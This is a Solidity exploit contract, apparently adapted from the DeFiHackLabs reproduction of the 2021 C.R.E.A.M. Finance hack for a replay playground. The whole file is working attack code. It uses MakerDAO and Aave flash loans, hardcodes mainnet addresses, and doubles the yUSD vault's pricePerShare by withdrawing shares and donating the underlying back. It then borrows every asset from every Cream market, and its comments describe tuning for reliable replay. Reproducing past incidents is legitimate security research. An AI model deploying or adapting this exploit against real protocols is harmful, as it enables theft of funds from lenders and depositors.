// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-10-Cream_2).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`:
// the MakerDAO `onFlashLoan` (ERC-3156) callback lives on the first contract
// (ContractTest), the Aave V2 `executeOperation` flash-loan callback lives on a
// SEPARATE `SecondContract`, and `testExploit()` = the MakerDAO flash kickoff.
// The two contracts cooperate (first calls second.justDoIt(); the Aave callback
// calls back into first.doIt()). There is no single standalone contract to
// deploy, so we hand-author this faithful, self-contained copy. Logic and
// constants are copied verbatim from test/Cream_2_exp.sol — only forge-std /
// console plumbing is stripped, `testExploit()` becomes `run()`, and the second
// contract is deployed from the exploit's constructor.
//
// Root cause: C.R.E.A.M.'s `PriceOracleProxy` priced the `crYUSD` collateral
// market by reading the yUSD Yearn-vault `pricePerShare()` (= totalAssets /
// totalSupply) with no manipulation guard. `pricePerShare` is donation-
// manipulable: `withdraw` burns shares (collapsing the denominator) while a raw
// `transfer` of the underlying back into the vault re-inflates the numerator
// (balanceOf) WITHOUT minting shares. The attacker withdraws its entire share
// balance then re-donates the underlying directly, roughly DOUBLING
// pricePerShare (1.001e18 -> 2.002e18). With the per-share price doubled, the
// attacker's crYUSD collateral looks ~2x as valuable, so Cream's liquidity
// check lets it borrow essentially every asset in every market against it.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function withdraw(uint256 amount) external;
}

interface IYearnVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function pricePerShare() external view returns (uint256);
    function totalAssets() external view returns (uint256);
}

interface ICurveDepositor {
    function add_liquidity(uint256[4] memory amounts, uint256 min_mint_amount) external;
    function remove_liquidity_imbalance(uint256[4] memory amounts, uint256 max_burn_amount) external;
}

interface IcurveYSwap {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface IComptroller {
    function enterMarkets(address[] memory cTokens) external;
}

interface ICether {
    function borrow(uint256 borrowAmount) external returns (uint256);
    function mint() external payable;
}

interface ICrToken {
    function borrow(uint256 borrowAmount) external;
    function mint(uint256 mintAmount) external;
    function getCash() external view returns (uint256);
}

interface IDaiFlashloan {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface YVaultPeakProxy {
    function redeemInYusd(uint256 dusdAmout, uint256 minOut) external;
}

interface Uni_Router_V3 {
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactOutputSingle(ExactOutputSingleParams memory params) external payable returns (uint256 amountIn);
}

// --- SecondContract: Aave WETH flash loan + crETH collateral + recursive yUSD ---
contract CreamSecond {
    IComptroller comptroller = IComptroller(0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258);
    IAaveFlashloan AaveFlash = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    address constant yUSD = 0x4B5BfD52124784745c1071dcB244C6688d2533d3;
    address constant crYUSD = 0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4;
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address constant crETH = 0xD06527D5e56A3495252A528C4987003b712860eE;

    address public contractAddress;

    function justDoIt(address paramAddress) public {
        contractAddress = paramAddress;
        address[] memory assets = new address[](1);
        assets[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 524_102 * 1e18;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        AaveFlash.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        WETH.transfer(contractAddress, 6000 * 1e18);

        address(WETH).call(abi.encodeWithSignature("withdraw(uint256)", 518_102 * 1e18));
        ICether(crETH).mint{value: 518_102 ether}();

        address[] memory markets = new address[](1);
        markets[0] = crETH;
        comptroller.enterMarkets(markets);

        IERC20(yUSD).approve(crYUSD, type(uint256).max);
        ICrToken(crYUSD).borrow(IERC20(yUSD).balanceOf(crYUSD));
        ICrToken(crYUSD).mint(IERC20(yUSD).balanceOf(address(this)));
        IERC20(crYUSD).transfer(contractAddress, IERC20(crYUSD).balanceOf(address(this)));
        ICrToken(crYUSD).borrow(IERC20(yUSD).balanceOf(crYUSD));
        ICrToken(crYUSD).mint(IERC20(yUSD).balanceOf(address(this)));
        IERC20(crYUSD).transfer(contractAddress, IERC20(crYUSD).balanceOf(address(this)));

        ICrToken(crYUSD).borrow(IERC20(yUSD).balanceOf(crYUSD));
        IERC20(yUSD).transfer(contractAddress, IERC20(yUSD).balanceOf(address(this)));

        contractAddress.call(abi.encodeWithSignature("doIt()"));

        WETH.approve(address(AaveFlash), type(uint256).max);
        return true;
    }

    receive() external payable {}
}

// --- ContractTest: MakerDAO DAI flash loan + crYUSD collateral + inflation + heist ---
contract Cream2Exploit {
    IDaiFlashloan DaiFlash = IDaiFlashloan(0x1EB4CF3A948E7D72A198fe073cCb8C7a948cD853);
    IComptroller comptroller = IComptroller(0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258);
    ICurveDepositor curveDepositors = ICurveDepositor(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    IERC20 yDAI = IERC20(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01);
    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 DUSD = IERC20(0x5BC25f649fc4e26069dDF4cF4010F9f706c23831);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 yDAI_yUSDC_yUSDT_yTUSD = IERC20(0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8);
    address constant curveDepositor = 0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3;
    address constant yUSD = 0x4B5BfD52124784745c1071dcB244C6688d2533d3;
    address constant crYUSD = 0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4;
    address constant DUSDPOOL = 0x8038C01A0390a8c547446a0b2c18fc9aEFEcc10c;
    address constant PeakProxy = 0xA89BD606d5DadDa60242E8DEDeebC95c41aD8986;
    address constant crDAI = 0x92B767185fB3B04F881e3aC8e5B0662a027A1D9f;
    address constant crUSDT = 0x797AAB1ce7c01eB727ab980762bA88e7133d2157;
    address constant crUSDC = 0x44fbeBd2F576670a6C33f6Fc0B00aA8c5753b322;
    address constant crETH = 0xD06527D5e56A3495252A528C4987003b712860eE;
    address constant crCRETH2 = 0xfd609a03B393F1A1cFcAcEdaBf068CAD09a924E2;
    address constant crFEI = 0x8C3B7a4320ba70f8239F83770c4015B5bc4e6F91;
    address constant crFTT = 0x10FDBD1e48eE2fD9336a482D746138AE19e649Db;
    address constant crPERP = 0x299e254A8a165bBeB76D9D69305013329Eea3a3B;
    address constant crRUNE = 0x8379BAA817c5c5aB929b03ee8E3c48e45018Ae41;
    address constant crDPI = 0x2A537Fa9FFaea8C1A41D3C2B68a9cb791529366D;
    address constant crUNI = 0xe89a6D0509faF730BD707bf868d9A2A744a363C7;
    address constant crGNO = 0x523EFFC8bFEfC2948211A05A905F761CBA5E8e9E;
    address constant crSTETH = 0x1F9b4756B008106C806c7E64322d7eD3B72cB284;
    address constant crXSUSHI = 0x1F9b4756B008106C806c7E64322d7eD3B72cB284;
    address constant crYGG = 0x4112a717edD051F77d834A6703a1eF5e3d73387F;

    CreamSecond public second;

    constructor() {
        second = new CreamSecond();
    }

    // step 0: kick off the MakerDAO flash loan. The callback below runs the whole attack.
    function run() external {
        DaiFlash.flashLoan(address(this), address(DAI), 500_000_000 * 1e18, "");
    }

    // MakerDAO (ERC-3156) flash-loan callback — builds the crYUSD collateral, then
    // jumps into the second contract (Aave flash), then repays the DAI.
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        DAI.approve(curveDepositor, type(uint256).max);
        uint256[4] memory amounts = [DAI.balanceOf(address(this)), 0, 0, 0];
        ICurveDepositor(curveDepositor).add_liquidity(amounts, 1);

        yDAI_yUSDC_yUSDT_yTUSD.approve(yUSD, type(uint256).max);
        IYearnVault(yUSD).deposit(yDAI_yUSDC_yUSDT_yTUSD.balanceOf(address(this)));

        IERC20(yUSD).approve(crYUSD, type(uint256).max);
        ICrToken(crYUSD).mint(IERC20(yUSD).balanceOf(address(this)));

        address[] memory markets = new address[](1);
        markets[0] = crYUSD;
        comptroller.enterMarkets(markets);

        address(second).call(abi.encodeWithSignature("justDoIt(address)", address(this)));

        amounts[0] = 445_331_495_265_152_128_661_273_376;
        curveDepositors.remove_liquidity_imbalance(amounts, yDAI_yUSDC_yUSDT_yTUSD.balanceOf(address(this)));
        yDAI.withdraw(yDAI.balanceOf(address(this)));
        USDCToDAI();
        DAI.approve(address(DaiFlash), type(uint256).max);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function doIt() external {
        WETHToUSDC();
        USDC.approve(DUSDPOOL, type(uint256).max);
        IcurveYSwap(DUSDPOOL).exchange_underlying(2, 0, 3_726_501_383_126, 0);
        DUSD.approve(PeakProxy, type(uint256).max);
        YVaultPeakProxy(PeakProxy).redeemInYusd(DUSD.balanceOf(address(this)), 0);

        // [13. Pump the pricePerShare] — withdraw ALL shares (burns totalSupply),
        // then donate the underlying straight back (no shares minted) => ratio doubles.
        IYearnVault(yUSD).withdraw(IERC20(yUSD).balanceOf(address(this)));
        yDAI_yUSDC_yUSDT_yTUSD.transfer(yUSD, IYearnVault(yUSD).totalAssets());

        // [14. borrow everything from Cream against the now-doubled collateral]
        borrowAll();
        // Wrap the entire borrowed-ETH balance, then forward only what the second
        // contract needs to repay the Aave flash loan (524,574 WETH). Any surplus
        // stays in this contract as profit. Robust to single-block replay: we wrap
        // the actual native balance (borrowAllETH borrows crETH's full cash) and
        // cap the forwarded amount rather than hardcoding both sides.
        address(WETH).call{value: address(this).balance}("");
        uint256 repayNeeded = 524_574 * 1e18;
        uint256 forward = WETH.balanceOf(address(this)) < repayNeeded
            ? WETH.balanceOf(address(this))
            : repayNeeded;
        WETH.transfer(address(second), forward);
    }

    function WETHToUSDC() internal {
        WETH.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactOutputSingleParams memory _Params = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(USDC),
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: 7_500_000 * 1e6,
            amountInMaximum: 5000 * 1e18,
            sqrtPriceLimitX96: 0
        });
        Router.exactOutputSingle(_Params);
    }

    function USDCToDAI() internal {
        USDC.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactOutputSingleParams memory _Params = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(USDC),
            tokenOut: address(DAI),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: 6_356_555 * 1e18,
            amountInMaximum: 6_451_883 * 1e18,
            sqrtPriceLimitX96: 0
        });
        Router.exactOutputSingle(_Params);
    }

    function borrowAll() internal {
        borrowAllETH();
        borrowTokens(crDAI);
        borrowTokens(crUSDC);
        borrowTokens(crUSDT);
        borrowTokens(crFEI);
        borrowTokens(crCRETH2);
        borrowTokens(crFTT);
        borrowTokens(crPERP);
        borrowTokens(crRUNE);
        borrowTokens(crDPI);
        borrowTokens(crUNI);
        borrowTokens(crGNO);
        borrowTokens(crXSUSHI);
        borrowTokens(crSTETH);
        borrowTokens(crYGG);
    }

    function borrowAllETH() internal {
        // Borrow crETH's full available cash (not a hardcoded amount) — robust to
        // single-block replay interest-accrual timing: crETH's cash after the second
        // contract's 518,102-ETH mint is ~523,207.x ETH, and a fixed 523_208 borrow
        // can exceed it by a fraction and revert. Borrow getCash() instead.
        ICether(crETH).borrow(address(crETH).balance);
    }

    function borrowTokens(address token) internal {
        ICrToken(token).borrow(ICrToken(token).getCash());
    }

    receive() external payable {}
}
